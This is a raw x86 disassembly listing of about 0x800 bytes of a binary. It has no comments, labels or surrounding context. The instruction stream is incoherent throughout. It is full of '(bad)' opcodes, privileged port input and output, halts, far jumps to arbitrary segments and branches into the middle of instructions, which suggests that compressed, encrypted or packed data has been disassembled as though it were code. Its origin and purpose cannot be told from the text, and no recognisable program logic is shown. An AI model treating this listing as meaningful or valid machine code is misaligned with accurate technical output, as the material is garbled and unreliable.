  41656c:	rcr    DWORD PTR [edx-0x76],0xb4
  416570:	cmp    BYTE PTR [edi-0x2d3ff1e8],bh
  416576:	dec    esi
  416577:	jp     0x4165ac
  416579:	pop    eax
  41657a:	or     BYTE PTR ds:0x1ca594a5,cl
  416580:	bound  ebp,QWORD PTR [ebx+eiz*1+0x62]
  416584:	mov    ds:0x77c58517,eax
  416589:	fdivr  DWORD PTR ds:0xd32523bc
  41658f:	dec    eax
  416590:	mov    WORD PTR ds:[eax+0x6a],fs
  416594:	mov    eax,0x95080492
  416599:	call   0x6c66cdea
  41659e:	adc    ch,ch
  4165a0:	mov    dl,0xa7
  4165a2:	ss inc esp
  4165a4:	jp     0x41655f
  4165a6:	ins    BYTE PTR es:[edi],dx
  4165a7:	sub    eax,0xfa9480c0
  4165ac:	dec    esi
  4165ad:	(bad)  
  4165ae:	pop    ss
  4165af:	out    0x28,eax
  4165b1:	(bad)  
  4165b2:	in     eax,dx
  4165b3:	lods   eax,DWORD PTR gs:[esi]
  4165b5:	push   ebp
  4165b6:	pop    edi
  4165b7:	sub    eax,0xae6a2f68
  4165bc:	cli    
  4165bd:	hlt    
  4165be:	cmp    DWORD PTR [eax],eax
  4165c0:	(bad)
  4165c3:	and    al,0xb5
  4165c5:	push   ecx
  4165c6:	or     eax,0x92fa53b6
  4165cb:	ss popa 
  4165cd:	xor    DWORD PTR [edi],ebp
  4165cf:	or     eax,0x780b219a
  4165d4:	or     BYTE PTR [ebx],al
  4165d6:	cmp    al,0xff
  4165d8:	add    al,0x5e
  4165da:	repnz aaa 
  4165dc:	pop    ds
  4165dd:	pop    edx
  4165de:	stos   DWORD PTR es:[edi],eax
  4165df:	dec    esp
  4165e0:	ins    DWORD PTR es:[edi],dx
  4165e1:	add    dh,dh
  4165e3:	sub    eax,0x3be32f46
  4165e8:	int3   
  4165e9:	sbb    al,0xf5
  4165eb:	xchg   edi,eax
  4165ec:	sub    bh,BYTE PTR [edx+0x6aa7782e]
  4165f2:	jmp    0x9e32:0x9c621b85
  4165f9:	jbe    0x4165f9
  4165fb:	pop    edx
  4165fc:	lds    edx,FWORD PTR [ebx]
  4165fe:	int    0x4d
  416600:	stos   BYTE PTR es:[edi],al
  416601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416602:	jbe    0x416586
  416604:	push   ecx
  416605:	in     al,0x19
  416607:	ins    DWORD PTR es:[edi],dx
  416608:	pop    edx
  416609:	cld    
  41660a:	es call 0x9a2b6990
  416610:	iret   
  416611:	scas   al,BYTE PTR es:[edi]
  416612:	retf   
  416613:	push   es
  416614:	leave  
  416615:	and    ch,BYTE PTR [edi+ebx*8-0x68a61a4]
  41661c:	das    
  41661d:	sub    eax,0xdf65161a
  416622:	or     DWORD PTR [ecx],eax
  416624:	or     DWORD PTR [edi+0x4f],ecx
  416627:	xor    BYTE PTR [eax],al
  416629:	fiadd  DWORD PTR [edi+0x64]
  41662c:	mov    dh,0xb1
  41662e:	test   al,0xa1
  416630:	xchg   BYTE PTR [edi-0x7b],ah
  416633:	int3   
  416634:	sbb    eax,edx
  416636:	dec    esp
  416637:	ss rcr cl,0x43
  41663b:	inc    eax
  41663c:	cmp    esi,DWORD PTR [eax+0x109ee229]
  416642:	shl    BYTE PTR [eax-0x1e],0xd7
  416646:	outs   dx,DWORD PTR ds:[esi]
  416647:	cmc    
  416648:	push   0x6003ac53
  41664d:	hlt    
  41664e:	and    al,0x93
  416650:	mov    ds,WORD PTR [eax+0x55]
  416653:	inc    eax
  416654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416655:	mov    dh,0x11
  416657:	xchg   BYTE PTR [ecx+eax*4-0x461770cf],ch
  41665e:	fild   QWORD PTR [eax-0x6b5b1962]
  416664:	std    
  416665:	lods   eax,DWORD PTR ds:[esi]
  416666:	je     0x4166bd
  416668:	(bad)  
  416669:	cwde   
  41666a:	add    al,0xca
  41666c:	push   cs
  41666d:	cli    
  41666e:	outs   dx,BYTE PTR ds:[esi]
  41666f:	sbb    dh,bl
  416671:	jmp    0xb5aacd66
  416676:	rcl    DWORD PTR [edi-0x78],1
  416679:	push   0xfffffff6
  41667b:	mov    DWORD PTR [ecx+0x39384729],ebx
  416681:	fimul  WORD PTR [ebx-0x4f286e19]
  416687:	xchg   ebx,eax
  416688:	(bad)  
  416689:	in     eax,dx
  41668a:	cld    
  41668b:	imul   edi,DWORD PTR [ecx+0x2e],0x644b1f54
  416692:	popf   
  416693:	clc    
  416694:	pop    eax
  416695:	ds mov ch,0x82
  416698:	stc    
  416699:	stos   BYTE PTR es:[edi],al
  41669a:	inc    eax
  41669b:	or     eax,0x556c6cff
  4166a0:	dec    ebp
  4166a1:	lock push esi
  4166a3:	push   ebp
  4166a4:	jne    0x416682
  4166a6:	push   0x50c3b83e
  4166ab:	push   0x2e
  4166ad:	inc    esi
  4166ae:	stos   BYTE PTR es:[edi],al
  4166af:	xor    esi,ebp
  4166b1:	jae    0x4166eb
  4166b3:	push   ds
  4166b4:	sbb    al,0x2a
  4166b6:	pop    edx
  4166b7:	idiv   DWORD PTR [ecx+0x1c07cbd]
  4166bd:	push   ss
  4166be:	and    DWORD PTR [ecx],edi
  4166c0:	sub    al,0xf2
  4166c2:	mov    eax,0xafada23c
  4166c7:	shr    BYTE PTR [edi+0x6],1
  4166ca:	js     0x41668f
  4166cc:	xchg   ebp,eax
  4166cd:	cli    
  4166ce:	stos   BYTE PTR es:[edi],al
  4166cf:	and    DWORD PTR [eax+0x5bd4c494],ebp
  4166d5:	adc    eax,0x305a7ef4
  4166da:	xchg   DWORD PTR [ecx+0x4aba411e],eax
  4166e0:	jno    0x4166cf
  4166e2:	out    dx,eax
  4166e3:	jmp    0x416730
  4166e5:	int3   
  4166e6:	sub    dl,dh
  4166e8:	mov    al,0x36
  4166ea:	dec    ebx
  4166eb:	nop
  4166ec:	mov    esi,0x6942cbf5
  4166f1:	icebp  
  4166f2:	loopne 0x41672c
  4166f4:	fbld   TBYTE PTR es:[ebx]
  4166f7:	adc    DWORD PTR [esi-0x1c],ebx
  4166fa:	fnstenv [ebx]
  4166fc:	cli    
  4166fd:	call   0x1fe51d35
  416702:	cmp    eax,0xe22861cd
  416707:	bound  eax,QWORD PTR [ebp+0x18]
  41670a:	lods   al,BYTE PTR ds:[esi]
  41670b:	cmp    ah,BYTE PTR [ebx]
  41670d:	mov    ecx,eax
  41670f:	ret    0x5f5e
  416712:	or     al,0xac
  416714:	leave  
  416715:	fnstcw WORD PTR ss:[edi+ebx*4-0x3b64c01e]
  41671d:	xor    al,0x38
  41671f:	dec    ebx
  416720:	adc    dh,BYTE PTR [ecx]
  416722:	lock ds cli 
  416725:	(bad)  
  416726:	lods   al,BYTE PTR ds:[esi]
  416727:	jecxz  0x416772
  416729:	mov    edi,0x532e7cb5
  41672e:	xchg   ebp,eax
  41672f:	mov    ch,0x5d
  416731:	or     DWORD PTR [edi],eax
  416733:	xchg   ebx,eax
  416734:	xchg   ebp,eax
  416735:	pop    edx
  416736:	aad    0xec
  416738:	rcr    bh,0x14
  41673b:	cmp    DWORD PTR [edi-0x1],esi
  41673e:	lods   eax,DWORD PTR ds:[esi]
  41673f:	adc    BYTE PTR [edx+0x30],0x79
  416743:	pop    ebx
  416744:	mov    fs:0xcb71b559,eax
  41674a:	ins    BYTE PTR es:[edi],dx
  41674b:	pop    ecx
  41674c:	mov    bh,0xa7
  41674e:	sbb    ch,cl
  416750:	sub    esi,DWORD PTR [edi]
  416752:	ret    
  416753:	imul   esi,DWORD PTR [eax],0xffffff91
  416756:	and    edx,DWORD PTR [eax]
  416758:	(bad)  
  41675a:	pop    esi
  41675b:	lock push esp
  41675d:	mov    bl,0x4f
  41675f:	sub    al,0x18
  416761:	dec    esi
  416762:	sbb    bh,BYTE PTR [eax-0x1a]
  416765:	ret    0xcfe4
  416768:	mov    eax,ds:0x9f8cc809
  41676d:	push   ebx
  41676e:	dec    ecx
  41676f:	add    al,0x44
  416771:	adc    BYTE PTR [eax],0x74
  416774:	call   0xf96bd49
  416779:	aad    0x45
  41677b:	enter  0xc156,0xc4
  41677f:	div    DWORD PTR [bp+0x48]
  416783:	mov    ds:0xc4a2560c,eax
  416788:	pop    es
  416789:	inc    esp
  41678a:	popa   
  41678b:	inc    edi
  41678d:	pop    esi
  41678e:	pop    ebx
  41678f:	dec    edi
  416790:	arpl   WORD PTR [esp+ebx*1],si
  416793:	in     al,dx
  416794:	xchg   esp,eax
  416795:	mov    ebx,0x6432a276
  41679a:	pop    edi
  41679b:	mov    eax,0x96d371ae
  4167a0:	adc    BYTE PTR [edi],ah
  4167a2:	xchg   ah,cl
  4167a4:	mov    edx,0xde377b8e
  4167a9:	addr16 out dx,al
  4167ab:	std    
  4167ac:	int3   
  4167ad:	pop    esp
  4167ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167af:	push   ebx
  4167b0:	sbb    DWORD PTR [ecx],ebx
  4167b2:	shr    BYTE PTR [ebx+0x7f65b0fc],1
  4167b8:	or     edx,edx
  4167ba:	inc    esi
  4167bb:	xor    eax,0x604c7650
  4167c0:	adc    ebp,0x56
  4167c3:	enter  0x1f76,0xee
  4167c7:	xor    BYTE PTR [ebp-0x3059e2b5],al
  4167cd:	mov    cl,0x6c
  4167cf:	mov    ebx,0x2616d991
  4167d4:	adc    bh,BYTE PTR [ebx]
  4167d6:	pop    edi
  4167d7:	pushf  
  4167d8:	sahf   
  4167d9:	cmp    eax,0x8865666d
  4167de:	cli    
  4167df:	arpl   WORD PTR [edi+0x4],bp
  4167e2:	ds out 0x3f,al
  4167e5:	gs loop 0x4167cc
  4167e8:	lahf   
  4167e9:	out    dx,al
  4167ea:	xchg   ecx,eax
  4167eb:	imul   edx,DWORD PTR [ebp+ecx*1+0x1a],0xc1bea7b8
  4167f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167f4:	loope  0x41684d
  4167f6:	not    BYTE PTR [esi-0x1a]
  4167f9:	xchg   BYTE PTR [esi+ecx*2+0x60],cl
  4167fd:	xor    al,0x60
  4167ff:	(bad)  
  416800:	popa   
  416801:	dec    edi
  416802:	test   eax,0xc3ba8c3a
  416807:	add    BYTE PTR [esi-0x3b],dh
  41680a:	mov    cl,0x46
  41680c:	xchg   ecx,eax
  41680d:	mov    cl,0x20
  41680f:	sbb    ch,BYTE PTR [edx+0x45]
  416812:	pop    ds
  416813:	xchg   ebp,ebp
  416815:	jle    0x41686e
  416817:	xchg   ecx,eax
  416818:	cld    
  416819:	adc    BYTE PTR [ecx],bh
  41681b:	mov    ebx,0xfb31aa47
  416820:	inc    eax
  416821:	repnz cmp BYTE PTR ds:0xb69421e8,dh
  416828:	fld    TBYTE PTR [esi+0xe5aa3b2]
  41682e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41682f:	(bad)  
  416830:	ror    BYTE PTR [esi],1
  416832:	lods   eax,DWORD PTR ds:[esi]
  416833:	in     eax,0xb3
  416835:	mov    ecx,0xbdc6370e
  41683a:	xchg   ebx,eax
  41683b:	fucom  st(6)
  41683d:	cmp    eax,0x4ba19b11
  416842:	xor    cl,BYTE PTR [esi+0x18]
  416845:	cmp    eax,DWORD PTR [ecx+eiz*2-0x3e]
  416849:	in     eax,0x7d
  41684b:	sahf   
  41684c:	cli    
  41684d:	sbb    eax,0xca26681f
  416852:	ret    
  416853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416854:	and    ah,BYTE PTR [esi+0x5c]
  416857:	mov    al,ds:0x95e228b1
  41685c:	frstor [ecx+0x56c2d07f]
  416862:	pop    ss
  416863:	cmp    dh,ch
  416865:	cwde   
  416866:	or     al,0x67
  416868:	and    eax,0x9a9ea3d0
  41686d:	shl    al,1
  41686f:	sub    DWORD PTR [esi],esp
  416871:	pop    ds
  416872:	cmp    DWORD PTR cs:[eax],edx
  416875:	dec    edi
  416876:	dec    ebx
  416877:	xor    eax,esp
  416879:	lock xchg ebp,eax
  41687b:	ds mov ecx,0x17caf0ec
  416881:	jbe    0x416872
  416883:	ret    
  416884:	push   esp
  416885:	(bad)  
  416886:	mov    ds:0xa94ce2c8,al
  41688b:	(bad)  
  41688c:	push   ebp
  41688d:	pop    ds
  41688e:	sub    esp,DWORD PTR [edi+eiz*1+0x75]
  416892:	inc    ecx
  416893:	mov    ss,WORD PTR [edx]
  416895:	jg     0x416865
  416897:	add    al,0xce
  41689a:	enter  0xd20f,0xed
  41689e:	retf   0xf91b
  4168a1:	push   ebp
  4168a2:	ss push ebp
  4168a4:	leave  
  4168a5:	fwait
  4168a6:	sbb    al,BYTE PTR [ebx]
  4168a8:	xor    bl,bl
  4168aa:	add    eax,0x4bbe00cb
  4168af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b0:	adc    DWORD PTR [ecx],esp
  4168b2:	inc    ebx
  4168b3:	pop    es
  4168b4:	ror    BYTE PTR [esi+0x35de925a],1
  4168ba:	xchg   DWORD PTR [esi],ebp
  4168bc:	outs   dx,BYTE PTR ds:[esi]
  4168bd:	in     al,dx
  4168be:	adc    eax,0x1c91a336
  4168c3:	adc    BYTE PTR [esi],bh
  4168c5:	inc    ebp
  4168c6:	arpl   WORD PTR [edi+0x28f84fe7],ax
  4168cc:	es daa 
  4168ce:	neg    DWORD PTR [ebx-0x797f4bcf]
  4168d4:	loop   0x416954
  4168d6:	mov    al,0xb2
  4168d8:	aas    
  4168d9:	mov    cl,0x8f
  4168db:	inc    ebp
  4168dc:	popf   
  4168dd:	nop
  4168de:	adc    ah,BYTE PTR [ebx]
  4168e0:	test   al,0x9b
  4168e2:	outs   dx,DWORD PTR ds:[esi]
  4168e3:	cmp    al,0xca
  4168e5:	sbb    esp,DWORD PTR [ebp-0x60367afd]
  4168eb:	addr16 enter 0x71df,0xf
  4168f0:	mov    ebx,0x50dc4c2c
  4168f5:	pop    sp
  4168f7:	and    eax,0xab3add7c
  4168fc:	and    BYTE PTR [ebp-0xb830ff6],dl
  416902:	ror    BYTE PTR ds:0xa3e74db,cl
  416908:	inc    esi
  416909:	je     0x4168fd
  41690b:	test   DWORD PTR [eax+0x1b],ebp
  41690e:	sub    cl,BYTE PTR [ebx]
  416910:	or     BYTE PTR [ebx+edi*1-0x6b9d3838],ch
  416917:	xchg   ecx,eax
  416918:	es ret 
  41691a:	jl     0x4168ad
  41691c:	stos   BYTE PTR es:[edi],al
  41691d:	xor    al,0xa1
  41691f:	mov    ecx,0x389ca570
  416924:	xor    ebx,esp
  416926:	loope  0x4168b8
  416928:	adc    BYTE PTR [eax+0x11ed8eed],al
  41692e:	jmp    0x3fca:0x28c88fa0
  416935:	pop    eax
  416936:	push   eax
  416937:	aaa    
  416938:	ins    BYTE PTR es:[edi],dx
  416939:	es ret 
  41693b:	lds    eax,FWORD PTR [edi+0x59]
  41693e:	sbb    al,0x76
  416940:	mov    al,0x65
  416942:	jne    0x416980
  416944:	dec    ecx
  416945:	and    al,0xa2
  416947:	jecxz  0x416984
  416949:	push   es
  41694a:	sub    DWORD PTR [eax],edx
  41694c:	aaa    
  41694d:	aaa    
  41694e:	or     BYTE PTR [eiz*8-0x23991d4],0x72
  416956:	mov    esi,0xb1eacf25
  41695b:	scas   al,BYTE PTR es:[edi]
  41695c:	xchg   esi,eax
  41695d:	cdq    
  41695e:	lea    esi,[edx+0x53ae7030]
  416964:	ja     0x4169dd
  416966:	not    BYTE PTR [ebp-0x46]
  416969:	int3   
  41696a:	popf   
  41696b:	push   ss
  41696c:	inc    ebp
  41696d:	(bad)  
  41696f:	shr    DWORD PTR [ecx-0x51f92ae3],cl
  416975:	stos   DWORD PTR es:[edi],eax
  416976:	jbe    0x416931
  416978:	cdq    
  416979:	bts    DWORD PTR [ecx],eax
  41697c:	push   ecx
  41697d:	mov    ebx,DWORD PTR [ebx-0x41]
  416980:	call   0x666:0x5bded88d
  416987:	push   ebp
  416988:	stos   DWORD PTR es:[edi],eax
  416989:	ffreep st(4)
  41698b:	(bad)  
  41698c:	mov    edx,DWORD PTR [esi+0xf82e112]
  416992:	sub    BYTE PTR [edi],ah
  416994:	sbb    cl,cl
  416996:	pop    ecx
  416997:	clc    
  416998:	test   DWORD PTR [ebx],0x77162624
  41699e:	adc    BYTE PTR [esi-0x7a5d1380],dl
  4169a4:	or     ebp,esp
  4169a6:	sub    esp,ebx
  4169a8:	inc    esi
  4169a9:	loop   0x416950
  4169ab:	or     BYTE PTR [edx-0x6c5cad2e],bl
  4169b1:	(bad)  
  4169b3:	cwde   
  4169b4:	out    0xf6,eax
  4169b6:	mov    edi,0xc664ffa1
  4169bb:	(bad)  
  4169bc:	mov    bl,0xf6
  4169be:	push   ecx
  4169bf:	xor    BYTE PTR [ebp-0xc],dl
  4169c2:	sti    
  4169c3:	lea    ecx,[esi+0x53]
  4169c6:	sub    edi,ecx
  4169c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169c9:	cmp    al,al
  4169cb:	dec    ecx
  4169cc:	pop    eax
  4169cd:	jo     0x416a2f
  4169cf:	push   esp
  4169d0:	mov    WORD PTR [eax+edi*2+0x4d532e8b],cs
  4169d7:	mov    eax,ds:0xa90110c6
  4169dc:	je     0x4169ad
  4169de:	imul   ebx,ebx,0x67
  4169e1:	adc    eax,0x6ef2637f
  4169e6:	jnp    0x4169df
  4169e8:	push   eax
  4169e9:	ret    0x9fa4
  4169ec:	lds    ebx,FWORD PTR [esi-0x3b0ec54c]
  4169f2:	retf   
  4169f3:	dec    esp
  4169f4:	lock data16 jae 0x416a2b
  4169f8:	dec    esi
  4169f9:	cmp    ecx,DWORD PTR [ebp+0x30e85610]
  4169ff:	dec    ecx
  416a00:	iret   
  416a01:	fistp  QWORD PTR [edx+0x4f547cb2]
  416a07:	sub    eax,0xc83a29d2
  416a0c:	mov    dl,BYTE PTR [ecx]
  416a0e:	sub    DWORD PTR [esi-0x785c8f70],eax
  416a14:	loope  0x416a00
  416a16:	xor    dh,ch
  416a18:	jecxz  0x4169e8
  416a1a:	lods   al,BYTE PTR ds:[esi]
  416a1b:	mov    edi,0xb4c4bc4a
  416a20:	xlat   BYTE PTR ds:[ebx]
  416a21:	mov    edx,0x490fad40
  416a26:	push   ebp
  416a27:	xchg   BYTE PTR [eax+edx*8],al
  416a2a:	add    al,0x9b
  416a2c:	pop    ss
  416a2d:	xchg   ebp,eax
  416a2e:	and    esp,DWORD PTR [edx-0x1ff79383]
  416a34:	sbb    edi,eax
  416a36:	cwde   
  416a37:	fwait
  416a38:	call   0xcab2:0x443f650a
  416a3f:	sbb    ah,cl
  416a41:	enter  0x7222,0x98
  416a45:	addr16 iret 
  416a47:	jae    0x416aaa
  416a49:	fdecstp 
  416a4b:	cmp    DWORD PTR [edi+0x26103885],0xfffffff3
  416a52:	add    BYTE PTR [edi+0x3de3e086],bh
  416a58:	mov    eax,ds:0xb3aad486
  416a5d:	mov    edx,DWORD PTR [ecx-0x6e]
  416a60:	adc    DWORD PTR [ecx+0x25eb28d4],ebp
  416a66:	push   ecx
  416a67:	(bad)  
  416a68:	push   ds
  416a69:	lods   eax,DWORD PTR ds:[si]
  416a6b:	sub    ah,ah
  416a6d:	or     eax,0x5729d800
  416a72:	sub    cl,bl
  416a74:	leave  
  416a75:	adc    edi,DWORD PTR [edi+0x4b]
  416a78:	scas   al,BYTE PTR es:[edi]
  416a79:	mov    eax,ds:0x18e12b93
  416a7e:	jg     0x416ae1
  416a80:	xchg   ebp,eax
  416a81:	mov    edx,0x91495ef
  416a86:	xor    al,BYTE PTR [edi]
  416a88:	into   
  416a89:	dec    edi
  416a8a:	rcl    DWORD PTR [ebx],0xc0
  416a8d:	xchg   ebp,eax
  416a8e:	xor    eax,0xb08ce748
  416a93:	pop    ecx
  416a94:	mov    ss,WORD PTR [edi]
  416a96:	sbb    al,0x38
  416a98:	test   BYTE PTR [edx],bh
  416a9a:	imul   ebx,DWORD PTR [ecx+0x2d],0xd673a44
  416aa1:	dec    esi
  416aa2:	addr16 inc edi
  416aa4:	je     0x416aa9
  416aa6:	ret    
  416aa7:	cmp    dl,BYTE PTR [eax-0x6b3a7e1e]
  416aad:	ja     0x416afb
  416aaf:	mov    edi,0x5b32aae
  416ab4:	loope  0x416aa1
  416ab6:	jmp    0x416ab8
  416ab8:	js     0x4f4aa9b6
  416abe:	sti    
  416abf:	cmp    BYTE PTR [edi],bh
  416ac1:	jle    0x416abc
  416ac3:	xchg   esp,eax
  416ac4:	pop    ecx
  416ac5:	sahf   
  416ac6:	sub    BYTE PTR [ebp+ecx*8+0x5c4f9ae1],bl
  416acd:	test   eax,0xa3af2837
  416ad2:	popf   
  416ad3:	aad    0xe9
  416ad5:	test   al,0x1e
  416ad7:	cmp    edx,DWORD PTR [ebp+0xcc1f8ef]
  416add:	imul   esi,DWORD PTR [edx],0x95e9bf1a
  416ae3:	add    eax,0xe24fd46d
  416ae8:	cdq    
  416ae9:	pop    esi
  416aea:	mov    ds:0xd2cbf414,al
  416aef:	lods   al,BYTE PTR ds:[esi]
  416af0:	cli    
  416af1:	pop    ss
  416af2:	or     dh,BYTE PTR [esi]
  416af4:	or     al,0x52
  416af6:	enter  0x31ea,0x56
  416afa:	sti    
  416afb:	and    ah,BYTE PTR [esi-0x301338b]
  416b01:	pop    eax
  416b02:	outs   dx,DWORD PTR ds:[esi]
  416b03:	ss in  eax,dx
  416b05:	out    0x94,eax
  416b07:	fdiv   DWORD PTR [eax+0x2d4675c4]
  416b0d:	pop    ecx
  416b0e:	mov    ebp,0xf151bcfb
  416b13:	outs   dx,DWORD PTR ds:[esi]
  416b14:	imul   ebx,DWORD PTR [edi-0x7b],0xfffffffe
  416b18:	mov    edx,0x9f3c0545
  416b1d:	xchg   edi,eax
  416b1e:	lods   al,BYTE PTR ds:[esi]
  416b1f:	mov    cl,0x51
  416b21:	js     0x416b99
  416b23:	in     eax,0x84
  416b25:	cwde   
  416b26:	pop    esp
  416b27:	dec    ecx
  416b28:	retf   0xbf1f
  416b2b:	push   es
  416b2c:	dec    eax
  416b2d:	xor    eax,0x44ec26c2
  416b32:	mov    ah,0x59
  416b34:	adc    al,0x74
  416b36:	in     al,0x7c
  416b38:	scas   al,BYTE PTR es:[edi]
  416b39:	inc    ebp
  416b3a:	xchg   edx,eax
  416b3b:	fadd   st,st(4)
  416b3d:	int    0x66
  416b3f:	push   ecx
  416b40:	jbe    0x416b62
  416b42:	jmp    0x5e9c:0x9f631121
  416b49:	leave  
  416b4a:	xlat   BYTE PTR ds:[ebx]
  416b4b:	push   0xffffff97
  416b4d:	inc    ecx
  416b4e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  416b50:	(bad)  
  416b51:	pop    esp
  416b52:	mov    al,0x89
  416b54:	dec    esi
  416b55:	fld    TBYTE PTR ds:0x3ddf4077
  416b5b:	lock (bad) 
  416b5d:	sub    eax,0x7a60b018
  416b62:	sbb    bl,BYTE PTR [ecx-0x69]
  416b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b66:	test   DWORD PTR [ebx+0x38],ebp
  416b69:	cmp    al,0xe
  416b6b:	jmp    0x89c:0x3277185d
  416b72:	add    BYTE PTR [edi+0x6386bdad],al
  416b78:	or     DWORD PTR cs:[edi+0x436d9b83],0x5750f18f
  416b83:	nop
  416b84:	je     0x416b83
  416b86:	dec    ecx
  416b87:	ds sub al,0x90
  416b8a:	push   eax
  416b8b:	retf   
  416b8c:	fild   WORD PTR [ecx]
  416b8e:	test   al,0x43
  416b91:	push   edx
  416b92:	sub    eax,0x2d147c0c
  416b97:	xchg   esi,eax
  416b98:	adc    ah,dl
  416b9a:	cmp    ah,BYTE PTR [esi]
  416b9c:	add    eax,0x11dc3783
  416ba1:	cmp    eax,DWORD PTR [esi-0x62]
  416ba4:	icebp  
  416ba5:	mov    eax,0x7ff069af
  416baa:	ins    BYTE PTR es:[edi],dx
  416bab:	mov    dh,0xed
  416bad:	cmp    BYTE PTR [ebx-0x6e],ah
  416bb0:	scas   eax,DWORD PTR es:[edi]
  416bb1:	xchg   ebp,eax
  416bb2:	and    al,0xcc
  416bb4:	cli    
  416bb5:	jns    0x416b7f
  416bb7:	xor    DWORD PTR ss:[edx-0x60c03049],ecx
  416bbe:	test   eax,0x9367088d
  416bc3:	pop    esi
  416bc4:	fidiv  WORD PTR [ebx+0x46]
  416bc7:	xor    al,bl
  416bc9:	pop    edx
  416bca:	add    esi,DWORD PTR [edi-0x60ae4d8]
  416bd0:	in     eax,0xfa
  416bd2:	jne    0x416c2b
  416bd4:	jmp    0x3e5c:0xb70f8c04
  416bdb:	(bad)  
  416bdc:	sub    cl,BYTE PTR [ecx]
  416bde:	adc    BYTE PTR [ecx+0x43b96fc5],dh
  416be4:	push   edi
  416be5:	(bad)  
  416be6:	in     eax,dx
  416be7:	mov    BYTE PTR [eax+0x2c],al
  416bea:	mov    DWORD PTR [edx+0x50],esp
  416bed:	push   ds
  416bee:	gs push cs
  416bf0:	fisttp DWORD PTR [esi]
  416bf2:	jb     0x416ba6
  416bf4:	pushf  
  416bf5:	jle    0x416c1b
  416bf7:	xor    dl,BYTE PTR [edi-0x72cb756a]
  416bfd:	out    dx,eax
  416bfe:	mov    al,0xb5
  416c00:	cmp    edi,DWORD PTR [eax+0x7c4f140a]
  416c06:	pop    esi
  416c07:	jmp    0x6ab18656
  416c0c:	pusha  
  416c0d:	leave  
  416c0e:	out    0x59,eax
  416c10:	cmp    bl,BYTE PTR [edx]
  416c12:	enter  0xc2cf,0x81
  416c16:	cwde   
  416c17:	add    esi,esi
  416c19:	gs retf 
  416c1b:	pop    es
  416c1c:	dec    ebp
  416c1d:	dec    edi
  416c1e:	(bad)  
  416c20:	fisubr WORD PTR [ecx+0x55780c44]
  416c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c27:	clc    
  416c28:	retf   
  416c29:	js     0x416c3f
  416c2b:	add    ebx,DWORD PTR [ebp+0x77]
  416c2e:	xor    eax,0xefcec214
  416c33:	mov    eax,ds:0x1f78861f
  416c38:	pop    ebx
  416c39:	dec    esp
  416c3a:	int    0xd6
  416c3c:	mov    BYTE PTR [ecx],ah
  416c3e:	mov    al,ds:0xb275a7f0
  416c43:	pop    edi
  416c44:	push   eax
  416c45:	js     0x416bda
  416c47:	adc    ebx,DWORD PTR [esp+edx*1+0xd946cbe]
  416c4e:	fldcw  WORD PTR [edi-0x6d]
  416c51:	sub    ecx,esp
  416c53:	sub    eax,0x37fe8782
  416c58:	jbe    0x416ca3
  416c5a:	sub    DWORD PTR [ebx+eax*4],ebx
  416c5d:	aas    
  416c5e:	imul   bh
  416c60:	cmp    eax,DWORD PTR ds:0x11f90add
  416c66:	sub    BYTE PTR [edi-0x56c34e93],dh
  416c6c:	jge    0x416bfa
  416c6e:	push   0x257437f8
  416c73:	rol    BYTE PTR [ebp-0x29],0xeb
  416c77:	xchg   ebx,eax
  416c78:	imul   ecx,DWORD PTR [ecx+0x32],0xb96433a
  416c7f:	test   BYTE PTR ds:[ecx-0x4c],ah
  416c83:	push   esi
  416c84:	inc    ebp
  416c85:	jnp    0x416ce6
  416c87:	inc    ecx
  416c88:	out    dx,al
  416c89:	out    dx,eax
  416c8a:	sub    bl,ch
  416c8c:	pop    ebx
  416c8d:	sti    
  416c8e:	pop    edi
  416c8f:	into   
  416c90:	js     0x416c75
  416c92:	sub    DWORD PTR [esi+0x22cf1b4e],ecx
  416c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c99:	sbb    eax,0xffffffb5
  416c9c:	pop    ds
  416c9d:	out    dx,eax
  416c9e:	pushf  
  416c9f:	sahf   
  416ca0:	cmp    eax,0xa25838ae
  416ca5:	outs   dx,BYTE PTR es:[esi]
  416ca7:	jge    0x416c8c
  416ca9:	pop    ss
  416caa:	xchg   ecx,eax
  416cab:	ins    DWORD PTR es:[edi],dx
  416cac:	shl    BYTE PTR [edi-0x7c],1
  416caf:	dec    edi
  416cb0:	arpl   WORD PTR [esi+0x34],di
  416cb3:	repnz or eax,0x740e0930
  416cb9:	sub    bl,BYTE PTR [edi+0x28]
  416cbc:	inc    ebx
  416cbd:	jmp    DWORD PTR [eax-0x4eeb2476]
  416cc3:	or     edi,edx
  416cc5:	sub    BYTE PTR [eax+0x5ececb9f],dh
  416ccb:	pop    edi
  416ccc:	call   0xa5c3:0xe83fb764
  416cd3:	jl     0x416d1e
  416cd5:	fistp  DWORD PTR [ecx-0x39]
  416cd8:	loopne 0x416d34
  416cda:	int    0xf1
  416cdc:	cdq    
  416cdd:	mov    esp,0x9f6f1520
  416ce2:	rol    DWORD PTR [edx],0x9c
  416ce5:	lock and al,0x1d
  416ce8:	retf   0x1d71
  416ceb:	(bad)  
  416cec:	test   eax,0xfe01c473
  416cf1:	aas    
  416cf2:	frstor [edi+0x1d]
  416cf5:	pop    esi
  416cf6:	lods   al,BYTE PTR ds:[esi]
  416cf7:	es push 0xf451acb2
  416cfd:	fmul   DWORD PTR [edx+0x3f8b27a]
  416d03:	jecxz  0x416d66
  416d05:	adc    DWORD PTR [ebx+0x5e5f3979],0x3f
  416d0c:	mov    ax,0x5552
  416d10:	lods   al,BYTE PTR ds:[esi]
  416d11:	nop
  416d12:	add    BYTE PTR [ebp*4-0x2cfc4dba],dl
  416d19:	mov    ch,0x72
  416d1b:	push   ds
  416d1c:	mov    ebp,0xda9b2ffe
  416d21:	sbb    edi,DWORD PTR [ebx]
  416d23:	mov    ecx,0xa4536f4c
  416d28:	pop    esi
  416d29:	sbb    al,0xce
  416d2b:	or     DWORD PTR [ebx+0x5c],esi
  416d2e:	or     BYTE PTR [edx],0x1b
  416d31:	mov    ecx,0xa7fe00db
  416d36:	lahf   
